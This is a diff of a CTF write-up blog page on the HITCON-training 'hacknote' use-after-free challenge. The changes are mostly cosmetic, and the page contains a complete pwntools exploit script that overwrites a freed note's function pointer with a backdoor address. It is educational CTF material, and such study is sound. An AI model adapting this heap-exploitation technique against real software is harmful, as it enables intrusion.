@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <title>HITCON-training-hacknote(UAF) | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" UAF , ctfwiki ">
+  <meta name="keywords" content=" ctfwiki , UAF ">
   <meta name="description" content="HITCON-training-hacknote(UAF) | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
@@ -153,7 +153,7 @@
     <div><a class="about  hasFriend  site_url"  href="/about">About</a><a style="width: 50%"  class="friends">Friends</a></div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="13">
-<input type="hidden" id="yelog_site_word_count" value="11.9k">
+<input type="hidden" id="yelog_site_word_count" value="12.3k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -313,7 +313,7 @@
         
         <a  class="All PWN题 "
            href="/2020/07/03/HITCON-training-hacknote-UAF/"
-           data-tag="UAF,ctfwiki"
+           data-tag="ctfwiki,UAF"
            data-author="" >
             <span class="post-title" title="HITCON-training-hacknote(UAF)">HITCON-training-hacknote(UAF)</span>
             <span class="post-date" title="2020-07-03 10:43:46">2020/07/03</span>
@@ -388,9 +388,9 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color4">UAF</a>
-            
             <a class="color3">ctfwiki</a>
+            
+            <a class="color4">UAF</a>
             
         </span>
         
@@ -402,7 +402,7 @@
     </div>
     <div class="article-meta">
         
-        <span>Count:737</span>
+        <span>Count:767</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -492,8 +492,45 @@ PIE:      No PIE (0x8048000)</code></pre></blockquote>
 <p>printnote(0)  </p>
 </blockquote>
 <p>即可触发后门函数</p>
-<h2 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"aaaa"</span>)</span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"ddaa"</span>)</span><br><span class="line"><span class="comment">#都是fastbin</span></span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#注意指针都没有被清空！</span></span><br><span class="line"><span class="comment">#fast bin (0x10)链表里： note1_header --&gt; note0_header --&gt; 0x0</span></span><br><span class="line"><span class="comment">#fast bin (0x28)链表里： note1_content --&gt; note0_content --&gt; 0x0</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment">#put指针被修改为magic地址</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>)<span class="comment">#执行magic</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h2><pre><code class="python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+r = process(&#39;./hacknote&#39;)
+def addnote(size, content):
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(&quot;1&quot;)
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(str(size))
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(content)
+def delnote(idx):
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(&quot;2&quot;)
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(str(idx))
+def printnote(idx):
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(&quot;3&quot;)
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(str(idx))
 
+magic = 0x08048986
+
+addnote(32, &quot;aaaa&quot;)
+addnote(32, &quot;ddaa&quot;)
+#都是fastbin
+delnote(0)
+delnote(1)
+#注意指针都没有被清空！
+#fast bin (0x10)链表里： note1_header --&gt; note0_header --&gt; 0x0
+#fast bin (0x28)链表里： note1_content --&gt; note0_content --&gt; 0x0
+
+addnote(8, p32(magic)) #put指针被修改为magic地址
+
+printnote(0)#执行magic
+
+r.interactive()
+</code></pre>
 <p>Hack The Planet<br>–2020.7.3 11:21</p>
 
       
